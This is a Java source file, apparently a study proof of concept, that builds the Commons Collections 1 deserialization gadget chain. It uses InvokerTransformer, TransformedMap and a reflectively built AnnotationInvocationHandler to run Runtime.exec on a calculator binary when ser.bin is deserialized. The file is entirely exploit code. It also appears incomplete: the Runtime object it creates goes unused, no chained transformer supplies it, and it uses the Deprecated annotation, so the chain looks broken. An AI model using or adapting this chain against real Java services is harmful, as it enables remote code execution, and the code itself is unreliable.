package cc1.ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class FinalEXP1 {
    public static void main(String[] args) throws Exception {
        String cmd = "/usr/bin/gnome-calculator";
        InvokerTransformer invokerTransformer = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[]{cmd}
        );
        Runtime input = Runtime.getRuntime();
        HashMap<Object,Object> hashMap =new HashMap<>();
        hashMap.put("a",1); // ensure Map.Entry entry not empty
        Map<Object,Object>decoratedMap = (TransformedMap) TransformedMap.decorate(
                hashMap,null, invokerTransformer
        );

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor aihConstructor = c.getDeclaredConstructor(Class.class,Map.class);
        aihConstructor.setAccessible(true);
        Object o = aihConstructor.newInstance(Deprecated.class,decoratedMap);

        serialize(o);
        deserialize("ser.bin");
    }
    public static void serialize(Object o) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(o);
    }
    public static Object deserialize(String fileName) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        return ois.readObject();
    }
}
